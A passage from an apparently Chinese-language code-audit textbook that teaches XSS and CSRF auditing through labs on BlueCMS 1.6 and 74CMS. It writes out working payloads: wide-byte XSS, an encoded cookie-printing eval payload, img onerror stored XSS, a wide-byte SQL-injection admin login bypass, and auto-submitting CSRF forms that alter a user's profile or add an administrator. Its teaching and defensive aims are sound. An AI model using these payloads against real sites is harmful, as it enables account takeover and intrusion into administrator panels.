上述正则表达式结尾无字符，可以构造Payload：a@qq.com<script>alert(1)<script>使用正则表达式匹配工具测试该Payload，如图4-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image240.jpg)

图4-7 正则表达式测试图

### 4.3.4 宽字节注入XSS

宽字节注入可以在编码设置不合理的情况下绕过防御函数addslashes。在使用GBK编码时，如果第一个字符的ASCII编码大于128，与MYSQL中的宽字节注入类似，其会认为前两个字符是一个汉字，会将后面的转移字符\“吃掉”，并将前两个字符拼接为汉字。这样就可以拼接JS恶意脚本。

l 案例代码如下：



<?php header("Content-Type: text/html;charset=**GBK**"); ?> 

<head> 

<title>gb xss</title> 

</head> 

<script> a="<?php echo addslashes($_GET['x']);?>"; 

</script>



l 分析漏洞与利用：

前台HTML编码设置为GBK编码，header("Content-Type: text/html;charset=GBK")。然后可以通过宽字节绕过过滤函数addslashes或GPC保护的参数x。注意：此时x参数并没有被htmlspecialchars过滤。

可考虑使用宽字节注入XSS  Payload：http://ip/gb.php?x=1%81"。测试结果可以通过查看页面的元素功能检查，如图4-8所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image242.jpg)

图4-8 宽字节XSS测试图

显示弹窗的XSS Payload为：x=1%81";alert(1)//，测试结果如图4-9所示。因此在实际应用场景中，建议使用UTF-8编码，从而防御宽字节注入。

```

```

图4-9 宽字节XSS效果图

## 4.4 XSS漏洞防御

XSS漏洞产生的原因是用户输入或URL中的内容可通过传递JS恶意脚本修改前台页面。所以其防御的总体思路是过滤掉用户的输入，并对输入进行HTML编码转换。通过上述防御可以将用户提交的所有内容进行过滤，并对动态输出到页面的内容进行HTML编码，从而使得脚本无法正常在浏览器执行。

（1）  对输入的内容进行过滤

输入内容的过滤可以分为白名单和黑名单过滤两种方式。

  黑名单可以过滤拦截大部分的XSS攻击，过滤常见的HTML标签包括：script、alert、svg、img、body等。但是不全面的黑名单还是存在被绕过的风险。

  白名单过滤基本可以完全防御XSS漏洞，但是在实际场景的程序中为了不影响实际业务，很少使用严格的白名单过滤内容。

（2）  对动态输出到页面的内容进行HTML编码

对输出进行HTML编码，就是通过函数，将用户的输入数据进行HTML编码，使其不能作为脚本执行。PHP内置了一些过滤函数可有效防御XSS漏洞，常用的内置过滤函数有：htmlspecialchars和htmlentities。

l htmlspecialchars函数：将预定义的特殊字符转换为HTML实体，被转换的字符如表4-3所示。

表4-3 HTML编码转换表

| 字符        | 替换后                                                 |
| ----------- | ------------------------------------------------------ |
| &（&符号）  | &amp;                                                  |
| "（双引号） | &quot;                                                 |
| '（单引号） | 设置ENT_QUOTES后，&#039或&apos（根据文档类型设置而定） |
| <（小于）   | &lt;                                                   |
| >（大于）   | &gt;                                                   |

下面给出htmlspecialchars案例代码。（ENT_COMPAT：默认。仅编码双引号；ENT_QUOTES：编码双引号和单引号；ENT_NOQUOTES：不编码任何引号。）



<?php

header("content-type:text/html;charset=utf-8");

$string = "<script>alert(1)</script>&<img src=x onerror='alert(/hacker/)'>";

$string1 = htmlspecialchars($string, ENT_COMPAT);

$string2 = htmlspecialchars($string, ENT_QUOTES);

$string3 = htmlspecialchars($string, ENT_NOQUOTES);

echo "1->".$string1."<br/>\n";

echo "2->".$string2."<br/>\n";

echo "3->".$string3."<br/>\n";

?>



将上述页面部署到Web根路径后，通过浏览器访问后查看源码，发现htmlspecialchars函数已经将特殊字符转义为实体编码，从而防御恶意脚本执行，结果为：



1->&lt;script&gt;alert(1)&lt;/script&gt;&amp;&lt;img src=x onerror='alert(/hacker/)'&gt;<br/>

2->&lt;script&gt;alert(1)&lt;/script&gt;&amp;&lt;img src=x onerror=&#039;alert(/hacker/)&#039;&gt;<br/>

3->&lt;script&gt;alert(1)&lt;/script&gt;&amp;&lt;img src=x onerror='alert(/hacker/)'&gt;<br/>



l htmlentities函数：将所有的HTML标签转换为HTML实体。

Htmlentities也可以防御XSS漏洞，其主要功能是转化所有的HTML代码，连同页面中无法识别的中文字符也将被转化。

在实际的应用场景开发中，使用htmlspecialchars转化掉基本字符就已经足够，使用htmlentities很容易引起乱码问题。

## 4.5 XSS审计CMS实践

### 4.5.1  实验：BlueCMS1.6 反射XSS审计

· 实验介绍

本实验将对BlueCMS1.6进行代码审计工作，审计该CMS中用户注册模块的反射XSS漏洞，并使用闭包的方式利用该漏洞弹窗。本次实验将从reg.htm文件中FORM表单开始分析。

· 预备知识

参考4.2.1节：反射型XSS漏洞； 4.3.2节：HTML编码不规范。

· 实验目的

掌握反射XSS的审计方法。

· 实验环境

Windows操作系统主机；BlueCMS1.6安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

审计该CMS的用户注册界面前台代码uploads\templates\default\reg.htm，如图4-10所示。确定前台页面中传递参数，并审计该页面的整体FORM表单传参情况。

```
l  该FORM表单内业务相关的参数传递方式为POST，传递的参数包括：user_name、pwd、pwd1、email、safecode。这些参数主要用来注册新用户使用，其会保存至后台数据库中。同时参数还通过check_pwd、check_email、check_user_name进行过滤，审计上述传递参数的过滤情况。
l  该FORM表单的点击按钮将触发校验函数check_form，该函数只对表单变量进行业务校验无安全漏洞。
l  该FORM表单点击将跳转到uploads\user.php文件处理。
除上述出参数外，该FORM表单还传递两个参数：from和act。审计这两个参数的传递过程，并分析数据流过滤情况，及参数如何渲染至前台页面。
```

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image246.jpg)

图4-10 用户注册前台代码图

```
下面对user.php部分代码流程进行介绍，代码如图4-11所示。当变量act等于reg时，程序将根据Session信息判断用户状态，然后使用函数template_assign向reg.htm页面中注册元素并渲染界面，该函数中只用参数from进行渲染。
至此，参数from从前台传递至后台并再次渲染至前台界面无过滤函数。因此，用户可通过该参数构造恶意脚本渲染至前台执行。下面对该from参数传递过程进行总结，如图4-12所示。
```

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image248.jpg)

图4-11 注册代码图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image250.jpg)

图4-12 from数据传递图

（2）  测试阶段

通过参数from构造可绕过addslashes函数的Payload。输入URL为：http://ip/user.php?act=reg&from=a，查看参数from在前台显示情况，如图4-13所示。使用闭合input标签方式构造Payload为：

http://ip/ user.php?act=reg&from="/><button onclick=alert(1)></button>

该Payload经过addslashes函数过滤后，过滤双引号字符"，结果应为：http://ip/ user.php?act=reg&from=/"/><button onclick=alert(1)></button>请求成功后，测试结果如图4-14所示。在“提交注册”按钮旁边出现一个新的按钮，点击该按钮触发弹窗。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image252.jpg)

图4-13 from前台显示图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image254.jpg)

图4-14 payload测试图

### 4.5.2  实验：BlueCMS1.6 存储XSS审计

· 实验介绍

本实验将对BlueCMS1.6进行代码审计工作，审计该CMS中用户修改信息模块中由于email参数未过滤，从而存在存储型XSS漏洞。本实验以user.htm文件中edit_form表单开始分析。

· 预备知识

参考4.2.2节：存储型XSS漏洞。

· 实验目的

掌握存储XSS的审计方法。

· 实验环境

Windows操作系统主机；BlueCMS1.6安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

审计该CMS用户修改信息的前台代码uploads\templates\default\user.htm，如图4-15所示。确定前台页面可传递参数，着重审计该页面的FORM表单传参情况。注：图中只有部分参数代码。

```
l  该FORM表单内的业务相关参数传递使用POST方式传递，传递的参数包括：email等。email参数默认值将从数据库中用户的信息读取出来，并显示到前台页面。
l  点击按钮触发校验函数check，该函数只校验了消息是否为空。同时指定act参数为“edit_user_info”。
l  该FORM表单点击将跳转到user.php文件。
```

审计uploads\user.php文件。由于前台页面将act赋值为“edit_user_info”

，因此将user.php代码定位到$act为edit_user_info部分，代码如图4-16所示。代码流程为：

l 首先根据$_Session判断是否用户处于登录状态。

l 然后对参数进行过滤，参数email使用三目运算符判断是否为空，若不为空则使用trim函数去除email字符串的首尾空格。

l 使用参数birthday、sex、mobile_phone、email，将所有参数直接拼接到SQL语句赋值给$sql变量。

l 使用query方法执行SQL语句。

```

```

图4-15 用户修改信息前台代码

参数email从前台传递至后台并存储到数据库中，当该页面再次刷新时，将加载email信息将执行恶意JS代码，图4-17为email参数传递过程。参数email的数据流经过两次过滤：第一次调用deep_addslashes函数过滤；第二次调用trim函数取去除首尾空格。需要设计可以绕过上述两个过滤函数的Payload。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image258.jpg)

图4-16 user.php部分代码

 

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image260.jpg)

图4-17 email数据流程图

（2）  测试阶段

查看数据库email字段的允许存储字节大小，email字段定义为varchar(40)，如图4-18所示，该字段能够容纳存储一个完整的Payload。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image262.jpg)

图4-18 email字段大小图

登录用户修改个人信息的前台页面，填写email字段的Payload为<script>alert(1)</script>，如图4-19所示。然后点击确定将恶意脚本通过email字段保存至数据库。

当用户输入“http://ip/blue/user.php”访问用户信息后，系统将自动弹出JS恶意脚本执行情况，测试结果如图4-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image264.jpg)

图4-19 修改邮箱图

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image266.jpg)

图4-20 XSS漏洞弹窗图

### 4.5.3  实验：74CMS3.4宽字节注入反射XSS审计

· 实验介绍

本实验将对74CMS进行代码审计工作，审计该CMS中全局搜索模块中，由于使用编码导致Key关键字存在宽字节注入漏洞。本实验从jobs-list.htm文件中搜索框相关的JS代码开始分析。

· 预备知识

参考4.2.1节：反射型XSS漏洞；4.3.1节：编解码绕过；4.3.4节：宽字节注入XSS。

· 实验目的

掌握宽字节注入XSS的审计方法。

· 实验环境

Windows操作系统主机；74CMS安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

审计该CMS中的工作列表前台页面代码jobs-list.htm文件，点击展开左侧templates\default目录，弹出的下拉列表中双击jobs-list.htm文件，如图4-21所示。这段JavaScript代码流程为：

l 定义变量getstr、defaultkey；

l 如果变量getkey不为空则将数据发送到allaround()函数（allaround函数位于templates/default/js/jquery.jobs-search.js文件中。该函数进行HTML页面拼接，然后调用函数search_location。）；

l 如果{#$smarty.get.key}可以闭合getkey变量的双引号就会造成反射型XSS。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image268.jpg)

图4-26 jobs-list.htm代码

```
那么哪个文件调用jobs-list.htm模板文件呢？经过查看发现主页搜索框中的“搜索”按钮会跳转到/plus/ajax_search_location.php文件，代码如图4-22所示。审计该文件流程：
l  判断参数act是否为空，若不为空则对参数值进行trim过滤，否则等于“QS_jobslist”。
l  将$_GET['key']值从UTF-8编码转换为GBK编码。
l  调用url_rewrite函数跳转到/jobs/jobs-list.php文件。
jobs-list.php文件代码如图4-23所示，其调用display函数将传递参数渲染至界面。
```

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image270.jpg)

图4-22 url_rewrite跳转代码

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image272.jpg)

图4-23 jobs-list.php代码

至此，给出key参数的传递数据流，如图4-24所示。该key参数并不从前台直接获取，而是通过调动后台php文件最终渲染得到的。该CMS使用的全局过滤函数将对双引号进行转义掉，且参数key使用GBK转换编码，因此考虑使用宽字节注入XSS将转义的反斜杠“吃掉”，从而闭合JS中的双引号。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image274.jpg)

图4-24 参数get.key流程图

（2）    测试阶段

分析前台页面请求情况，如图4-25所示。首页输入关键字，查看发送HTTP请求数据包情况，其发送请求为：http://192.168.0.11/74cms34/jobs/jobs-list.php?key=11。

![图片12](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image276.gif)

图4-25 搜索功能请求图

为上述HTTP请求构造Payload，本次使用宽字节注入及编码绕过方式拼接JS代码，其Payload如下：

1%df%22;eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))//;

l %df%22：%df为宽字节注入标识，%22为双引号从而闭合标签；

l 97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41：经过Unicode解码工具得到该脚本内容为alert(document.cookie)。

测试结果如图4-26所示。形成反射型XSS漏洞，并打印用户的Cookie值。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image278.jpg)

图4-26 宽字节XSS弹窗图

### 4.5.4  实验：74CMS3.0存储XSS审计

· 实验介绍

本实验将对74CMS进行代码审计工作，审计该CMS中管理员系统的广告管理模块，该模块中由于编码问题导致参数link_logo存在宽字节注入漏洞，从而注入存储型XSS Payload。本实验从add.htm文件中添加链接的FORM表单开始分析。

· 预备知识

参考4.2.2节：存储型XSS漏洞；4.3.4节：宽字节注入XSS。

· 实验目的

掌握宽字节注入XSS的审计方法。

· 实验环境

Windows操作系统主机；74CMS3.0安装包；PhpStorm工具。

· 实验步骤

（1）  审计阶段

l link_logo字段入库流程分析：

审计该CMS中的管理员界面“广告”选项栏下“添加链接”页面代码templates\default\link\add.htm文件，弹出的下拉列表中双击add.htm文件，分析添加链接的FORM表单文件，该表单发送HTTP的POST请求，发送链接为“?act=save”代码如下：



<form action="**?act=save**" method="post"> //发送?act=save请求让后台PHP代码处理

<table width="100%" border="0" cellspacing="0" cellpadding="5">

<tr>

<td width="120" align="right">申请页面(必填)：</td>

<td width="460">

{#foreach from=$cat item=li#} 

…省略…



查找接收该HTTP请求的PHP后台代码，其对应的后台页面文件为link\add_link.php文件，如图4-27所示。其代码执行流程为：

l 程序检测网站是否开启自助申请链接，如果没有，将阻止用户申请。

l 将获取到的link_name、link_url、link_logo、app_notes等参数使用trim函数处理，并赋值到setsqlarr数组中。

l 调用inserttable函数将setsqlarr数组数据插入到数据库中。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image280.jpg)

图4-27 add_link.php代码

```
add_link.php文件程序开始时，包含了公共文件common.inc.php，该文件将调用将mystrip_tags函数将特殊字符&、"、<、>进行HTML实体转码，代码如下：
```



function mystrip_tags($string)

{

$string = **str_replace(array('&', '"', '<', '>'), array('&', '"', '<', '>'), $string); //****将特殊字符进行HTML实体转码替换**

$string = strip_tags($string);

return $string;

}



l link_logo字段前台显示流程分析：

后台/admin/admin_link.php负责管理申请的友情链接，程序首先检查管理员权限，然后获取前端页面传过来进行拼接SQL语句，并进入到get_links函数内进行数据库查询。

查询完成后将获得结果传入到admin\templates\default\link\admin_link.htmadmin_link.htm文件中，如图4-28所示。模板文件中参数包括：link_id、link_url、link_logo。其中，显示logo直接使用数据库传入过来的link_logo参数，并作为img图像的src参数且该参数用户可控，所以构成存储型XSS。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image282.jpg)

图4-28 admin_link.htm代码

至此，给出参数link_logo在程序中的传参过程，如图4-29所示。link_logo参数传递过程中使用mystrip_tags函数过滤不能使用HTML与JS标签，可以考虑使用事件标签注入XSS。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image284.jpg)

图4-29 link_logo参数传递过程

（2）  测试阶段

设计XSS Payload绕过函数mystrip_tags函数，使用Payload为：x onerror=alert(1)。构造后拼接前台显示HTML代码为：<img src=x onerror=alert(1)/>。

访问http://192.168.0.11/74cms30进入网站首页，点击网站底部的“申请友情连接”，如图4-30所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image286.jpg)

图4-30 测试图1

在弹出的页面中，输入如下设计好的Payload，然后点击提交。其中Logo地址处为真正的攻击payload，x为了使img图像报错，然后调用onerror参数弹出对话框，如图4-31所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image288.jpg)

图4-31 测试图2

访问http://192.168.0.11/74cms30/admin进入管理员界面当点击“友情链接”，将鼠标移动到LOGO位置处，页面从数据库加载已创建Payload触发弹窗XSS，如图4-32。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image290.jpg)

图4-32 XSS漏洞弹窗图

## 4.6 单元小结

本单元主要学习了代码审计中的XSS漏洞，通过对各类XSS漏洞介绍，使读者熟悉审计XSS漏洞的方式及方法。本单元要求读者着重掌握各类XSS注入漏洞的PHP代码形式，并通过对简单CMS的代码走读审计代码中存在的XSS漏洞。下图4-38为第四单元总结图。



 

# 单元5 CSRF漏洞审计

本单元介绍了代码审计中CSRF漏洞审计，其主要分为四个部分进行介绍。

第一部分主要介绍CSRF漏洞的基础知识，包括：CSRF漏洞攻击过程、CSRF漏洞的攻击场景、CSRF漏洞的攻击条件。

第二部分介绍CSRF漏洞的分类，包括：GET型CSRF漏洞、POST型CSRF漏洞及代码案例。

第三部分介绍CSRF漏洞的常见防御机制，包括：HTTP Referer字段防御、验证Token防御、验证码验证技术。

第四部分使用74CSM3.0中增加管理员的CSRF漏洞和YzmCMS5.8中增加会员的CSRF漏洞进行审计实践。

**单元构图：**

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image292.jpg)

**单元目标：**

\1. 熟悉CSRF漏洞的概念及分类；

\2. 了解CSFR漏洞的挖掘技巧；

\3. 掌握CSRF漏洞的常见代码审计方法；

\4. 掌握CSRF漏洞的防御方法。

## 5.1 CSRF漏洞挖掘

### 5.1.1 CSRF漏洞简介

CSRF（Cross-Site Request Forgery）漏洞名为跨站请求伪造。相比XSS漏洞而言，该漏洞不及XSS流行，因此也更难防范。简单的说，该漏洞将使得攻击者使用正常用户的身份发送恶意请求。其对服务器而言是合法请求，但是对于用户而言，攻击者盗用了其身份进行了请求，从而达到恶意目的。例如：攻击者通过用户的身份发送邮件、添加管理员账号、购买商品，虚拟转账等。这将泄漏个人隐私并威胁到目标用户的财产安全。

### 5.1.2 CSRF漏洞挖掘经验

在网站应用中，CSRF漏洞经常出现的功能点包括：管理后台、会员中心、论坛帖子等与权限紧密相关的页面。而其中最为重要的则是管理后台的CSRF漏洞，这也是CSRF漏洞的重灾区。

对于黑盒测试而言，给出如下几种判断方法：

l 最简单的方法是抓取网站中正常请求的HTTP数据包，查看该数据包中是否存在Referer字段或token字段，若不存在则极有可能存在CSRF漏洞。

l 如果存在Referer字段，但是将HTTP数据包删除Referer字段重新提交后，该提交依旧有效，那么也可以确定该页面存在CSRF漏洞。

l 针对CSRF漏洞，还涌现出一些专门针对CSRF漏洞进行检测的工具，例如：CSRFTester、CSRF Request Builder等。其检测原理为伪造HTTP请求并发送后，判断是响应成功。

在代码审计方面，需着重审计网站后台代码的关于Token和Referer验证的核心文件，也可直接搜索关键字“token”或“Referer”等。针对于CSRF漏洞则主要考虑网站中的后台代码，需注意以下几点：

l 目标网站的增删改的代码逻辑，是否使用Token及Referer验证；

l 用户退出或关闭浏览器后，Session是都依旧有效；

l Token信息是否足够随机而不被猜解；

l Token验证与Referer验证算法是否存在漏洞等。

## 5.2 CSRF漏洞分类

根据HTTP请求的方式不同，一般将CSRF漏洞分为两种，分别是：GET型CSRF、POST型CSRF。由于GET型CSRF漏洞使用的是明文传输，因此该类型并不多见。在代码审计过程中，将大部分以POST型CSRF漏洞为主。本小节将对两种CSRF漏洞的代码进行介绍。

### 5.2.1 GET型CSRF漏洞

（1）GET型CSRF漏洞的审计代码案例如下：



**if(!check_csrf_login($link)){**           //检查用户是否处于登录状态

  **header("location:csrf_get_login.php");}**

if(**isset($_GET['submit'])**){

  if($_GET['sex']!=null && $_GET['phonenum']!=null && $_GET['add']!=null && $_GET['email']!=null){

​    $getdata=escape($link, $_GET);          //解析数据

​    $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";      //更新用户信息

​    $result=execute($link, $query);         //执行更新

​    if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){

​      header("location:csrf_get.php");

​    }else {$html1.='修改失败，请重试';}}}



（2）分析漏洞：

上述代码为某用户修改个人详细信息后台代码。其使用HTTP的GET方式传递参数sex、phonenum、add等信息进行更新。在使用SQL语句查询数据库之前，处理请求过程中并没有对用户的token、referer等参数进行验证。从而可以形成GET型CSRF漏洞。

l 用户lucy处于登录状态：用户输入正确用户名密码登录平台；

l 查看HTTP请求的URL：http://192.168.0.11/ /csrf_get_edit.php?**sex**=girl&**phonenum**=12345678922&**add**=beijing&**email**=lucy%40test.com&**submit**=submit

l 代码审计无CSRF防护，假设攻击者预修改用户lucy的邮箱为自己的邮箱为360@360.com；地址为360。诱使用户lucy处于登录状态且Session未过期情况下，点击创建Payload为：http://192.168.0.11 /csrf_get_edit.php?sex=girl&phonenum=12345678922&**add=360**&**email=360@360.com**&submit=submit

l 用户lucy修改了个人信息，如图5-1所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image294.jpg)

图5-1 用户修改信息图

### 5.2.2 POST型CSRF漏洞

（1）  POST型CSRF漏洞的审计代码案例如下：



if(!check_csrf_login($link)){  header("location:csrf_post_login.php");}

if(isset(**$_POST['submit'])**){

  if(**$_POST['sex']**!=null && **$_POST['phonenum']**!=null && **$_POST['add']**!=null && **$_POST['email']**!=null){

​    $getdata=escape($link, **$_POST**);

​    $query="update member set sex='{$getdata['sex']}',phonenum='{$getdata['phonenum']}',address='{$getdata['add']}',email='{$getdata['email']}' where username='{$_SESSION['csrf']['username']}'";

​    $result=execute($link, $query);

​    if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){

​      header("location:csrf_post.php");}else {

​      $html1.='修改失败，请重试';}}} 



（2）  分析漏洞：

顾名思义，POST型CSRF漏洞使用HTTP的POST方式提交数据。上述代码存在CSRF漏洞的原因与GET型CSRF漏洞类似，主要原因是未对用户的token、referer等参数进行验证。

POST型CSRF漏洞在利用方式上与GET型CSRF漏洞不同。POST型CSRF漏洞不能通过伪造URL的方式进行攻击。利用POST型CSRF漏洞的方式大多需要攻击者先搭建一个站点，并在站点上做一个发送恶意数据的表单，诱使用户点击触发该表单提交链接。当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改数据。

（3）  利用方法：

  攻击者在攻击服务器上网站的根路径编写文件为post.html，代码如下：



<html><head>

<script>

window.onload = function() {  //自动触发postsubmit提交FORM表单

 document.getElementById("postsubmit").click();}

</script>

</head><body>

//提交修改信息的POST请求

<FORM method="post" action="http://192.168.0.11/csrf_post_edit.php">

  <input id="sex" type="text" name="sex" value="girl" />

  <input id="phonenum" type="text" name="phonenum" value="12345678922" />

  <input id="add" type="text" name="add" value="hacker" />

  <input id="email" type="text" name="email" value="360@360.com" />

  <input id="postsubmit" type="submit" name="submit" value="submit" />

</FORM></body></html>



  诱使用户点击该恶意网站链接：http://攻击者服务器IP/post.html。将触发上述代码并修改个人信息。

## 5.3 CSRF漏洞防御

CSRF漏洞防御的主要问题在于登录的用户是否在可信情况下操作。由于HTTP是无状态的协议，很多CMS为了能确定登录用户的可信状态从而防御CSRF漏洞，将主要进行以下三中防御方法：验证HTTP Referer字段从而确定HTTP请求的来源、验证Token从而确定用户的请求是否可信、验证码验证加固防御。本节将介绍上述三种防御方法。

### 5.3.1 验证HTTP Referer字段

HTTP Referer是HTTP协议头中有一个字段，它记录了此次HTTP请求的来源地址。Referer字段的作用是保证用户访问一个安全受限页面的请求都来自于同一个网站。

例如：用户小煊需要进行银行转账时，访问 http://bank.example/withdraw?account=xuan&amount=100&for=Mallory，用户需登录bank.example，然后通过点击页面上的按钮来触发转账事件。该转帐请求的 Referer 值就会是转账按钮所在的页面URL（通常以bank.example域名开头）。如果攻击者要对银行网站实施CSRF攻击，用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向攻击者的网站，图5-2为HTTP头中referer字段内容。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image296.jpg)

图5-2 HTTP请求Referer头

因此，银行网站只需要对于每一个转账请求验证其Referer值，如果是以 bank.example开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。流程图如图5-3所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image298.jpg)

图5-3 CSRF流程图

Referer防御CSRF漏洞的优点是简单易行，网站的普通开发人员无需关心CSRF漏洞，只需要在最后为所有安全敏感的请求统一增加拦截器检查Referer即可。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑。 

给出某靶场代码如下，服务器判断用户的请求头的Referer字段必须包含服务器名称，如果包含则允许通过，否则拒绝。



 if( stripos( $_SERVER[ 'HTTP_REFERER' ] ,$_SERVER[ 'SERVER_NAME' ]) !== false )



  值得注意的是，该方法并不是万无一失。Referer值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。

### 5.3.2 验证Token

CSRF攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都存在于cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过安全验证。

要抵御CSRF关键在于请求中放入攻击者所不能伪造的信息，并且该信息不存在于cookie中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或token内容不正确，则认为可能是CSRF攻击而拒绝该请求。

l 某网站生成token代码：



//生成一个token,以当前微妙时间+一个5位的前缀

function set_token(){

  if(**isset($_SESSION['token'])**){

​    unset($_SESSION['token']);}

   **$_SESSION['token']=str_replace('.','',uniqid(mt_rand(10000,99999),true));}**



l 前台页面提交token代码;



<div id="per_info">

  <FORM method="get">

  <h1 class="per_title">hello,{$name},欢迎来到个人会员中心</h1>

   <p class="per_name">姓名:{$name}</p>

  省略......

  **<input type="hidden" name="token" value="{$_SESSION['token']}" />**

  <input class="sub" type="submit" name="submit" value="submit"/>

  </FORM>

</div>



l 验证token代码：



if(isset($_GET['submit'])){

  if($_GET['sex']!=null && $_GET['phonenum']!=null && $_GET['add']!=null

​    && $_GET['email']!=null && **$_GET['token']==$_SESSION['token']**){

​    省略……

​    if(mysqli_affected_rows($link)==1 || mysqli_affected_rows($link)==0){

​      header("location:token_get.php");

}else {$html1.="<p>修改失败,请重新登录</p>"; }}}

**set_token();  //****生成token**



### 5.3.3 验证码验证

  某些网站会在敏感的操作页面进行验证码验证功能，从而防止CSRF漏洞的发生，例如：用户的登陆页面、注册页面、支付页面等。但是考虑到输入验证码会影响用户体验，该功能没有Token验证实用。

## 5.4 CSRF审计CMS实践

### 5.4.1  实验：74CMS3.0 CSRF审计

· 实验介绍

本实验将对74CMS进行代码审计工作，审计该CMS中添加管理员模块是否存在CSRF漏洞。首先使用宽字节注入SQL登录管理员，然后利用CSRF漏洞添加新管理员test_123。

· 预备知识

参考5.2.2节：POST型CSRF漏洞。

· 实验目的

掌握CSRF的审计方法。

· 实验环境

Windows操作系统主机；74CMS3.0安装包；PhpStorm工具。

· 实验步骤

（1）审计阶段

点击展开admin目录，在弹出的下拉列表中双击admin_users.php页面，右侧页面可以看到相关代码。其中当获取的act参数为add_users_save时，执行添加管理员操作，代码如图5-4所示，程序流程为：

l 代码段首先检查当前用户是否权限添加，如果没有权限则直接终止掉。

l 对用户信息字段进行检查，包括：admin_name、email、password、rank等。

l 进入添加管理员操作，将setsqlarr数组执行inserttable操作，将管理员插入数据库。

在添加管理员过程中，由于未对请求的Referer或token字段进行校验，从而导致该功能将存在POST型的CSRF漏洞。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image300.jpg)

图5-4 admin_users.php部分代码

（2）测试利用阶段

CSRF漏洞的必备条件是用户处于登录状态，因此首先使用宽字节SQL注入登录该CMS。访问http://ip/admin/admin_login.php页面来到网站后台登录认证页面。使用BurpSuit拦截数据包后，将用户名admin修改为“%df%27 or 1=1%23”，宽字节注入SQL语句使其登录成功，如图5-5所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image302.jpg)

图5-5 宽字节XSS数据包

关闭BurpSuite的代理抓包功能（即intercept is off），重新刷新一遍浏览器发现页面已经进入后台。登录成功后，如图5-6所示。至此已经满足CSRF漏洞的首要条件，即用户处于登录状态。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image304.jpg)

图5-6 登录成功数据包

然后进入管理员后台，点击“管理员”标签页，查看网站后台管理员状态，此时系统只有一个管理员为admin。点击“添加管理员”，进入添加管理员FORM表单，如图5-7所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image306.jpg)

图5-7 添加管理员功能页面

制作用户点击的恶意网站页面，该网页用于提交增加管理员功能，设计的HTML页面为增加管理员的FORM表单，提交HTTP的POST请求，且请求路径为：http://127.0.0.1/admin/admin_users.php?act=add_users_save

其中参数可参考CMS中增加管理员的FORM表单。用户名为test_123，密码为123456。页面名称为csrf.html且内容如下：



<!DOCTYPE html><html lang="en">

<head>

    <meta charset="utf-8">

  <title>恭喜你中奖啦</title>

</head>

